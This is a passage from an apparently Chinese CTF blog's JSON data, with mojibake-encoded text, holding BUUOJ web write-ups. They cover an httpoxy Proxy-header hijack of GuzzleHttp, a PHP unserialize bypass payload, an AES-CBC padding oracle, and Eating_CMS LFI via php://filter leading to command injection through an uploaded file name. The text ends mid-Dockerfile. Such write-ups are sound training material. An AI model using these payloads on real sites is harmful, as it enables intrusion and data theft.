æ˜¾ç„¶ï¼Œç›´æ¥è¯»flagæ²¡å¯èƒ½ï¼Œä¸ä¼šæœ‰é‚£ä¸ªæƒé™ï¼Œå¦åˆ™å°±ä¸ä¼šå†å¥—å±‚/readflagäº†ã€‚ä»¤æˆ‘ä»¬å¥½å¥‡çš„æ˜¯ï¼Œä»–ç”¨äº†ä¸€ä¸ªGuzzleHttpï¼Œæ˜¾ç„¶è¿™ä¸ªåº“ä¸æ˜¯éšä¾¿æ‰¾çš„ï¼Œä¸€å®šæœ‰é—®é¢˜ã€‚ Googleæœä¸€ä¸‹\"guzzlehttp vuln\"ï¼Œæ’åç¬¬ä¸€çš„å°±å‘Šè¯‰æˆ‘ä»¬é—®é¢˜äº†ï¼ŒHTTP Request Redirectionï¼Œåˆåhttpoxyã€‚ç›´æ¥æœå°±èƒ½æœåˆ°å®˜ç½‘ï¼Œç®€å•æ¥è¯´ï¼ŒPHPç­‰Webæ¡†æ¶åœ¨CGIæ¨¡å¼ä¸‹è¿è¡Œæ—¶ï¼Œä¼šå°†ä¼ å…¥çš„HTTPå¤´å½“ä½œCGIåº”ç”¨ç¨‹åºçš„ç¯å¢ƒå˜é‡ï¼Œè€Œå¯¹äºPHPæ¥è¯´ï¼Œå®ƒä¼šä½¿ç”¨getenv()è·å–ç¯å¢ƒå˜é‡ï¼Œåœ¨php-fpmç­‰CGIæ¨¡å¼ä¸‹ä¼šæŠŠHTTPå¤´åˆå¹¶åˆ°\\(\\_SERVERæ•°ç»„ä¸­ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥Proxy: 127.0.0.1ï¼Œåœ¨PHPç«¯çš„\\)_SERVERä¼šå¯¼è‡´å‡ºç°$_SERVER['HTTP_PROXY']èµ‹å€¼ä¸º'127.0.0.1'ã€‚è€Œä¸€éƒ¨åˆ†çš„HTTPåº“ä¼šåº”ç”¨HTTP_PROXYå˜é‡ä½œä¸ºä»£ç†ï¼Œä¾‹å¦‚GuzzleHttpã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è®¿é—®é¡µé¢æ—¶åŠ ä¸Šä¸€ä¸ªProxy: 127.0.0.1:8080çš„HTTPå¤´ï¼ŒGuzzleHttpè®¿é—®æ—¶ä¼šæŠŠè¯·æ±‚ä»£ç†ç»™127.0.0.1:8080ã€‚æˆ‘ä»¬å°±æœ‰æœºä¼šä¿®æ”¹å†…å®¹äº†ã€‚ ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼ŒCGIåœ¨ä¼ å…¥HTTPå¤´æ—¶ï¼Œä¼šæ·»åŠ HTTP_å‰ç¼€ï¼Œå¦‚HTTP_HOSTã€‚ æœ¬é¢˜å®Œå…¨ç¬¦åˆæ¡ä»¶ï¼Œæˆ‘ä»¬ä¼ å…¥Proxy: XXX:YYï¼Œå°±ä¼šæŠŠå¯¹127.0.0.1:5000/api/eligibleçš„è¯·æ±‚è½¬å‘åˆ°XXX:YYï¼Œæˆ‘ä»¬å†ä¿®æ”¹è¿”å›å†…å®¹å³å¯ã€‚ ç”±äºæ˜¯BUUOJç¯å¢ƒï¼Œä¸èƒ½ç”¨å¤–éƒ¨æœåŠ¡å™¨ï¼Œæˆ‘ä»¬ç”¨Linux Labsçš„ncæ¥å®Œæˆã€‚ å…ˆç”¨BurpSuiteæ‹¦æˆªè¯·æ±‚ 123456789101112GET /?flag HTTP/1.1Host: node3.buuoj.cn:26215Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Edg/83.0.478.37Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6DNT: 1Connection: closeProxy: 174.1.23.2:8080 Proxyåœ°å€æŒ‡å‘Linux Labsçš„IPï¼Œä¸Šé¢ç”¨ncç›‘å¬8080ç«¯å£ã€‚åœ¨Linux Labsä¸Šä¿®æ”¹è¿”å›åŒ…ã€‚ 123456789HTTP/1.1 200 OKServer: nginx/1.14.2Date: Mon, 01 Jun 2020 01:30:05 GMTContent-Type: text/html; charset=UTF-8Connection: closeX-Powered-By: PHP/5.6.23Content-Length: 12&#123;&quot;success&quot;:true&#125; å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚ flag{d00bc26f-ce1d-406b-8742-91079447e475}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"BUUOJåˆ·é¢˜-Web-AreUSerialz","slug":"BUUOJåˆ·é¢˜-Web-AreUSerialz","date":"2020-05-14T12:42:40.000Z","updated":"2020-05-15T12:41:24.087Z","comments":true,"path":"2020/05/14/BUUOJåˆ·é¢˜-Web-AreUSerialz/","link":"","permalink":"http://tiaonmmn.github.io/2020/05/14/BUUOJ%E5%88%B7%E9%A2%98-Web-AreUSerialz/","excerpt":"","text":"2020ç½‘é¼æ¯é’é¾™ç»„çš„AreUSerialzã€‚ ä¸Šæ¥ç»™æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; å¾ˆç®€å•ï¼Œç»™äº†ä¸ªFileHandlerç±»ï¼Œç„¶åGETæ–¹å¼ä¼ åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚æ³¨æ„åˆ°è¿”å›çš„HTTPå¤´é‡ŒX-Powered-Byä¸ºPHP/7.4.3ï¼Œç‰ˆæœ¬å¾ˆé«˜ã€‚ FileHandlerç±»é‡Œæœ‰ä¸‰ä¸ªprotectedå˜é‡ï¼Œ\\(opå†³å®šæ˜¯è¯»è¿˜æ˜¯å†™ï¼Œä¸º1åˆ™å†™æ–‡ä»¶ï¼Œ2åˆ™è¯»æ–‡ä»¶å¹¶è¾“å‡ºã€‚ä½†æ˜¯æœ‰ä¸ª\\_\\_destructï¼Œä¼šæŠŠ\\)opæ”¹ä¸º1ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±è¦æƒ³åŠæ³•ç»•è¿‡__destructå‡½æ•°ã€‚åŒæ—¶ï¼Œåœ¨$_GETä¼ å‚çš„æ—¶å€™è¿˜æœ‰ä¸€ä¸ªis_validå‡½æ•°ï¼Œåˆ¤æ–­ä¼ å…¥çš„å­—ç¬¦ä¸²æ˜¯ä¸æ˜¯éƒ½åœ¨å¯è§å­—ç¬¦èŒƒå›´å†…ã€‚ æˆ‘ä»¬ç¿»PHPçš„æ–‡æ¡£ï¼Œå…¶ä¸­æåˆ°å¦‚æœç±»ä¸­å˜é‡ä¸ºprivate protectedå±æ€§ï¼Œä¼šåœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­æ·»åŠ ç‰¹æ®Šæ ‡è¯†ã€‚å› æ­¤æ­£å¸¸åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¼šè¢«is_valid()æ£€æµ‹ã€‚ åæ¥åœ¨æŸç¯‡æ–‡ç« ä¸­çœ‹åˆ°ï¼ŒPHP7.2ä»¥ä¸Šç‰ˆæœ¬ååºåˆ—åŒ–æ—¶æ— è§†private protectedå…³é”®å­—ã€‚é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ç”¨publicå£°æ˜å˜é‡å°±è¡Œäº†ã€‚ æˆ–è€…ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Sä»£æ›¿sï¼Œå‚è€ƒè¿™é‡Œï¼Œå…¶ä¸­æåˆ°ä¸ºäº†é˜²æ­¢ä¸¢å¤±%00å­—ç¬¦ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ç”¨Sæ’å…¥16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚æ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åº”ä¸ºï¼šO:11:\"FileHandler\":3:{s:5:\"ï¿½*ï¿½op\";i:2;s:11:\"ï¿½*ï¿½filename\";s:8:\"flag.php\";s:10:\"ï¿½*ï¿½content\";N;}ã€‚å…¶ä¸­ï¿½ä¸º%00ã€‚æˆ‘ä»¬å¯ä»¥æ”¹å†™ä¸ºO:11:\"FileHandler\":3:{S:5:\"\\00*\\00op\";i:2;S:11:\"\\00*\\00filename\";s:8:\"flag.php\";S:10:\"\\00*\\00content\";N;}ã€‚è¿™æ ·ä¹Ÿå¯ä»¥ç»•è¿‡is_valid()ã€‚ æœ€åï¼Œè¿™é¢˜åœ¨BUUOJä¸Šçš„ç¯å¢ƒå’Œæ¯”èµ› ç¯å¢ƒä¸ä¸€æ ·ã€‚BUUOJä¸Šæˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»ç›¸å¯¹è·¯å¾„ä¸‹çš„flag.phpã€‚ä½†æ˜¯æ¯”èµ›ç¯å¢ƒä¸‹æˆ‘ä»¬è¿˜éœ€è¦è¯»/proc/self/cmdlineï¼Œç¡®è®¤å·¥ä½œç›®å½•ã€‚ P.S.å¦‚æœååºåˆ—åŒ–åç±»çš„å…ƒç´ ä¸ªæ•°ä¸åŸå§‹ç±»çš„ä¸ªæ•°å¯¹ä¸ä¸Šï¼Œå°±ä¼šæ‰“æ–­æ‰§è¡Œ__destruct()ï¼Œå°±åƒç»•è¿‡__wakeup()ä¸€æ ·ã€‚ flag{8eba897c-a688-444f-b0e0-63e9cab136ce}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"}]},{"title":"BUUOJåˆ·é¢˜-Web-WebDog","slug":"BUUOJåˆ·é¢˜-Web-WebDog","date":"2020-04-23T02:22:16.000Z","updated":"2020-08-27T07:13:35.389Z","comments":true,"path":"2020/04/23/BUUOJåˆ·é¢˜-Web-WebDog/","link":"","permalink":"http://tiaonmmn.github.io/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/","excerpt":"","text":"NPUCTF 2020çš„WebğŸ•ï¼Œå¾ˆåŸºç¡€çš„AES CBCã€‚ 12345678910111213141516171819202122232425262728293031323334353637&lt;?php error_reporting(0);include(&#x27;config.php&#x27;); # $key,$flagdefine(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); //å®šä¹‰åŠ å¯†æ–¹å¼define(&quot;SECRET_KEY&quot;, $key); //å®šä¹‰å¯†é’¥define(&quot;IV&quot;,&quot;6666666666666666&quot;); //å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6define(&quot;BR&quot;,&#x27;&lt;br&gt;&#x27;);if(!isset($_GET[&#x27;source&#x27;]))header(&#x27;location:./index.php?source=1&#x27;);#var_dump($GLOBALS); //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿfunction aes_encrypt($iv,$data)&#123; echo &quot;--------encrypt---------&quot;.BR; echo &#x27;IV:&#x27;.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;&#125;function aes_decrypt($iv,$data)&#123; return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#x27;False&#x27;);&#125;if($_GET[&#x27;method&#x27;]==&#x27;encrypt&#x27;)&#123; $iv = IV; $data = $flag; echo aes_encrypt($iv,$data);&#125; else if($_GET[&#x27;method&#x27;]==&quot;decrypt&quot;)&#123; $iv = @$_POST[&#x27;iv&#x27;]; $data = @$_POST[&#x27;data&#x27;]; echo aes_decrypt($iv,$data);&#125;echo &quot;æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯&quot;.BR;if($_GET[&#x27;source&#x27;]==1)highlight_file(__FILE__);?&gt; å…è®¸æˆ‘ä»¬åŠ å¯†æˆ–è§£å¯†ï¼ŒåŠ å¯†ä¼šæŠŠ$flagçš„å†…å®¹åŠ å¯†æ˜¾ç¤ºï¼Œè€Œè§£å¯†æ—¶å…è®¸æˆ‘ä»¬è¾“å…¥IVå’Œå¯†æ–‡ï¼Œç”¨ç›¸åŒçš„keyè§£å¯†ã€‚é‚£ä¹ˆçœ‹èµ·æ¥æˆ‘ä»¬å¯ä»¥ç›´æ¥decryptäº†ï¼Œç„¶åå‘ç°å¹¶ä¸è¡Œã€‚æ³¨æ„åˆ°21è¡Œè§£å¯†çš„æ—¶å€™åé¢è¿˜åŠ äº†ä¸ªorï¼Œå½“æˆ‘ä»¬è§£å¯†æˆåŠŸæ—¶orçš„å·¦ç«¯ä¸ºTrueï¼Œé‚£ä¹ˆä¼šç›´æ¥è¿”å›Trueï¼Œå‚è€ƒè¿™é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜æ‹¿ä¸åˆ°æ˜æ–‡ã€‚ ç„¶åå‘ç°å®ƒç”¨çš„åŠ å¯†æ–¹å¼æ˜¯AES CBCï¼Œé‚£ä¹ˆå°±æƒ³åˆ°AES CBCçš„ä¸¤ç§æ”»å‡»æ‰‹æ³•ï¼šPadding Oracleå’Œå­—èŠ‚åè½¬ã€‚Padding Oracleé€‚åˆåœ¨ä¸æ¸…æ¥škeyå’ŒIVçš„æƒ…å†µä¸‹è§£å¯†å¯†æ–‡ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦çš„ã€‚å…·ä½“è¯·å‚è€ƒè¿™é‡Œã€‚Padding Oracleçš„æ¡ä»¶æ˜¯èƒ½åˆ†è¾¨æ­£å¸¸è§£å¯†å’Œè§£å¯†å¤±è´¥çš„æƒ…å†µï¼Œæœ¬é¢˜è§£å¯†å¤±è´¥æ—¶ä¼šè¿”å›Falseï¼Œè¶³å¤ŸåŒºåˆ†äº†ã€‚ flag{0e55ec5f-fdee-4455-96a3-20ebd390da59}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"AES","slug":"AES","permalink":"http://tiaonmmn.github.io/tags/AES/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Eating-CMS","slug":"BUUOJåˆ·é¢˜-Web-Eating-CMS","date":"2020-04-07T02:31:52.000Z","updated":"2020-04-07T08:00:42.570Z","comments":true,"path":"2020/04/07/BUUOJåˆ·é¢˜-Web-Eating-CMS/","link":"","permalink":"http://tiaonmmn.github.io/2020/04/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Eating-CMS/","excerpt":"","text":"N1CTF 2018çš„Eating_CMSã€‚ æ‰“å¼€æ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œç™»é™†çš„æ—¶å€™ä¼šæ˜¾ç¤ºSQLè¯­å¥ã€‚çŒœæµ‹æœ‰register.phpï¼Œæœç„¶æœ‰ï¼Œæ³¨å†Œåç™»é™†ï¼Œæ˜¾ç¤ºæ–°çš„é¡µé¢ã€‚æ³¨æ„åˆ°URLä¸ºhttp://0008abbc-5e70-4d41-b1d7-7d161114c40b.node3.buuoj.cn/user.php?page=guestï¼Œè¯•ä¸‹LFIã€‚user.php?page=/var/www/html/guestï¼Œå‘ç°å¯ä»¥æ­£å¸¸è®¿é—®ï¼ŒLFIæ²¡è·‘äº†ã€‚è¯•ä¸‹PHP Filterï¼šuser.php?page=php://filter/convert.base64-encode/resource=indexï¼Œå¾—åˆ°index.phpçš„æºç ï¼Œç„¶åæ‰’ä¸‹æ¥å·²çŸ¥æ–‡ä»¶ã€‚ index.php123456789&lt;?phprequire_once &quot;function.php&quot;;if(isset($_SESSION[&#x27;login&#x27;] ))&#123; Header(&quot;Location: user.php?page=info&quot;);&#125;else&#123; include &quot;templates/index.html&quot;;&#125;?&gt; function.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?phpsession_start();require_once &quot;config.php&quot;;function Hacker()&#123; Header(&quot;Location: hacker.php&quot;); die();&#125;function filter_directory()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function filter_directory_guest()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function Filter($string)&#123; global $mysqli; $blacklist = &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;; $whitelist = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;; for ($i = 0; $i &lt; strlen($string); $i++) &#123; if (strpos(&quot;$whitelist&quot;, $string[$i]) === false) &#123; Hacker(); &#125; &#125; if (preg_match(&quot;/$blacklist/is&quot;, $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return &quot;&quot;; &#125;&#125;function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function login($user, $pass)&#123; $user = Filter($user); $pass = md5($pass); $sql = &quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;$user&#x27; and `password_which_you_do_not_know_too` = &#x27;$pass&#x27;&quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION[&#x27;user&#x27;] = $data[username_which_you_do_not_know]; $_SESSION[&#x27;login&#x27;] = 1; $_SESSION[&#x27;isadmin&#x27;] = $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return;&#125;function updateadmin($level,$user)&#123; $sql = &quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;$level&#x27; where `username_which_you_do_not_know`=&#x27;$user&#x27; &quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) &#123; return true; &#125; else &#123; return false; &#125; return;&#125;function register($user, $pass)&#123; global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = &quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;$user&#x27;,&#x27;$pass&#x27;,&#x27;0&#x27;)&quot;; $res = sql_query($sql); return $mysqli-&gt;insert_id;&#125;function logout()&#123; session_destroy(); Header(&quot;Location: index.php&quot;);&#125;?&gt; user.php12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once(&quot;function.php&quot;);if( !isset( $_SESSION[&#x27;user&#x27;] ))&#123; Header(&quot;Location: index.php&quot;);&#125;if($_SESSION[&#x27;isadmin&#x27;] === &#x27;1&#x27;)&#123; $oper_you_can_do = $OPERATE_admin;&#125;else&#123; $oper_you_can_do = $OPERATE;&#125;//die($_SESSION[&#x27;isadmin&#x27;]);if($_SESSION[&#x27;isadmin&#x27;] === &#x27;1&#x27;)&#123; if(!isset($_GET[&#x27;page&#x27;]) || $_GET[&#x27;page&#x27;] === &#x27;&#x27;)&#123; $page = &#x27;info&#x27;; &#125;else &#123; $page = $_GET[&#x27;page&#x27;]; &#125;&#125;else&#123; if(!isset($_GET[&#x27;page&#x27;])|| $_GET[&#x27;page&#x27;] === &#x27;&#x27;)&#123; $page = &#x27;guest&#x27;; &#125;else &#123; $page = $_GET[&#x27;page&#x27;]; if($page === &#x27;info&#x27;) &#123;// echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;); Header(&quot;Location: user.php?page=guest&quot;); &#125; &#125;&#125;filter_directory();//if(!in_array($page,$oper_you_can_do))&#123;// $page = &#x27;info&#x27;;//&#125;include &quot;$page.php&quot;;?&gt; config.php123456789101112131415161718&lt;?phperror_reporting(E_ERROR | E_WARNING | E_PARSE);define(BASEDIR, &quot;/var/www/html/&quot;);define(FLAG_SIG, 1);$OPERATE = array(&#x27;userinfo&#x27;,&#x27;upload&#x27;,&#x27;search&#x27;);$OPERATE_admin = array(&#x27;userinfo&#x27;,&#x27;upload&#x27;,&#x27;search&#x27;,&#x27;manage&#x27;);$DBHOST = &quot;localhost&quot;;$DBUSER = &quot;root&quot;;$DBPASS = &quot;Nu1LCTF2018!@#qwe&quot;;//$DBPASS = &quot;&quot;;$DBNAME = &quot;N1CTF&quot;;$mysqli = @new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);if(mysqli_connect_errno())&#123; echo &quot;no sql connection&quot;.mysqli_connect_error(); $mysqli=null; die();&#125;?&gt; register.php123456789101112131415161718192021222324&lt;?phprequire_once &quot;function.php&quot;;if($_POST[&#x27;action&#x27;] === &#x27;register&#x27;)&#123; if (isset($_POST[&#x27;username&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123; $user = $_POST[&#x27;username&#x27;]; $pass = $_POST[&#x27;password&#x27;]; $res = register($user,$pass); if($res)&#123; Header(&quot;Location: index.php&quot;); &#125;else&#123; $errmsg = &quot;Username has been registered!&quot;; &#125; &#125; else&#123; Header(&quot;Location: error_parameter.php&quot;); &#125;&#125;if (!$_SESSION[&#x27;login&#x27;]) &#123; include &quot;templates/register.html&quot;;&#125; else &#123; Header(&quot;Location : user.php?page=info&quot;);&#125;?&gt; info.php123456&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly &quot;);&#125;include &quot;templates/info.html&quot;;?&gt; info.phpé‡Œä¼šinclude templates/info.htmlï¼Œæ‰“å¼€åæœ‰ä¸ªæç¤ºffffllllaaaaggg.phpï¼Œå¾ˆæ˜æ˜¾çš„ç›´æ¥è¯»æºç æ˜¯è¡Œä¸é€šçš„ã€‚çœ‹ä¸€ä¸‹è¿‡æ»¤å‡½æ•° 12345678910111213141516171819function filter_directory_guest()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125; parse_urlå‡½æ•°è§£æURLï¼Œç›´æ¥ç»•è¿‡ã€‚å…·ä½“è¯·å‚è€ƒè¿™é‡Œï¼Œhttp://d95fe231-c608-4167-98d0-6205f111a1ae.node3.buuoj.cn//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaagggã€‚å¾—åˆ°äº†ffffllllaaaaggg.phpçš„å†…å®¹ ffffllllaaaaggg.php1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly&quot;);&#125;else &#123; echo &quot;you can find sth in m4aaannngggeee&quot;;&#125;?&gt; å†è¯»m4aaannngggeeeæ–‡ä»¶ã€‚ 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly&quot;);&#125;include &quot;templates/upload.html&quot;;?&gt; è®¿é—®templates/upload.htmlåå‘ç°å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ˜¯upllloadddd.phpï¼Œæ¥ç€è¯» upllloadddd.php1234567891011121314151617181920212223242526&lt;?php$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);$size = 10000000;$path = &quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;;$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];if(is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123; if(!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$path.$filename))&#123; die(&quot;error:can not move&quot;); &#125;&#125;else&#123; die(&quot;error:not an upload file&quot;);&#125;$newfile = $path.$filename;echo &quot;file upload success&lt;br /&gt;&quot;;echo $filename;$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);echo &quot;&lt;img src=&#x27;data:image/png;base64,&quot;.$picdata.&quot;&#x27;&gt;&lt;/img&gt;&quot;;if($_FILES[&#x27;file&#x27;][&#x27;error&#x27;]&gt;0)&#123; unlink($newfile); die(&quot;Upload file error: &quot;);&#125;$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#x27;file&#x27;][&#x27;name&#x27;]));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125;?&gt; æ²¡æœ‰ä»»ä½•é™åˆ¶ç›´æ¥ä¸Šä¼ ï¼ŒåŒæ—¶é†’ç›®çš„systemæç¤ºæˆ‘ä»¬è¦å‘½ä»¤æ³¨å…¥ã€‚æ„é€ xxx.jpg|lsæ–‡ä»¶ä¸Šä¼ åˆ—ç›®å½•ã€‚ ç„¶åå°±æ‰¾flagäº†ã€‚æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çš„è¾“å…¥ä¼šå†™å…¥æ–‡ä»¶åï¼ŒLinuxä¸‹ä¾‹å¦‚/è¿™æ ·çš„å­—ç¬¦ä¸èƒ½ç”¨åœ¨æ–‡ä»¶åä¸Šï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥xxx.jpg|ls /è¿™æ ·åˆ—æ ¹ç›®å½•ï¼Œè¿‚å›ä¸€ä¸‹ï¼Œç”¨echo yyy| `base64 -d`è¿™æ ·æ‰§è¡Œå‘½ä»¤ã€‚ flag{d0c7071f-f2b8-41e1-907f-ba8b00bd0a1b}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]},{"title":"Codegate CTF 2020 Preliminary renderer","slug":"Codegate-2020-renderer","date":"2020-03-07T12:17:00.000Z","updated":"2020-05-18T13:01:30.930Z","comments":true,"path":"2020/03/07/Codegate-2020-renderer/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/07/Codegate-2020-renderer/","excerpt":"","text":"Codegate CTF 2020çš„rendererã€‚ç»™äº†Description: It is my first flask project with nginx. Write your own message, and get flag! http://XXXXXXX/renderer åŒæ—¶ç»™äº†ä¸¤ä¸ªé™„ä»¶ï¼š settings/run.sh12345678910service nginx stopmv /etc/nginx/sites-enabled/default /tmp/mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flaskservice nginx restartuwsgi /home/src/uwsgi.ini &amp;/bin/bash /home/cleaner.sh &amp;/bin/bash Dockerfile123456789101112131415161718192021222324FROM python:2.7.16ENV FLAG 